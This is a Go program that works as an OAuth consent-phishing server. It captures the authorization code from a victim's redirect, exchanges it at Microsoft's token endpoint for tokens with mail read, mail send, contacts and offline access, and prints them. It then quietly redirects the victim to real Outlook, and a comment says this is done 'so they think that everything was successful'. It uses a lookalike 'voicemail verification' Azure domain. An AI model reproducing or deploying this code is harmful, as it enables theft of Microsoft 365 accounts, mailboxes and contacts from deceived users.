package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
)

func requestHandler(w http.ResponseWriter, req *http.Request) {

	u, err := url.Parse(req.RequestURI)
	if err != nil {
		panic(err)
	}
	m, _ := url.ParseQuery(u.RawQuery)
	fmt.Println(u.RawQuery)
	getToken(m["code"][0])
	target := "https://outlook.office365.com/"
	//redirect the user so they think that everything was successful
	http.Redirect(w, req, target, http.StatusTemporaryRedirect)
}

func getToken(code string) {
	Transport := http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: false},
	}
	client := http.Client{Transport: &Transport}
	client_id := "014ad028-58d3-418a-89c9-3030fa6b00c2"                        //change to your APP-id
	scope := "offline_access%20people.read%20contacts.read.shared%20mail.read%20openid%20user.read%20mail.send.shared%20email%20profile" //change to the permissions you need/want
	redirect_uri := "https://voicemalverificatlon.azurewebsites.net/voice/verify/oauthServer"                //change to match the Redirect URI you set in your app at apps.dev.microsoft.com

	postData := fmt.Sprintf("client_id=%s&scope=%s&code=%s&redirect_uri=%s&grant_type=authorization_code", client_id, scope, code, redirect_uri)

	req, err := http.NewRequest("POST", "https://login.windows.net/common/oauth2/v2.0/token", strings.NewReader(postData))
	if err != nil {
		return
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	fmt.Println(string(body))
}

func main() {
	fmt.Println("starting")
	http.HandleFunc("/", requestHandler)
	http.ListenAndServeTLS(":443", "cert.pem", "key.pem", nil)
}
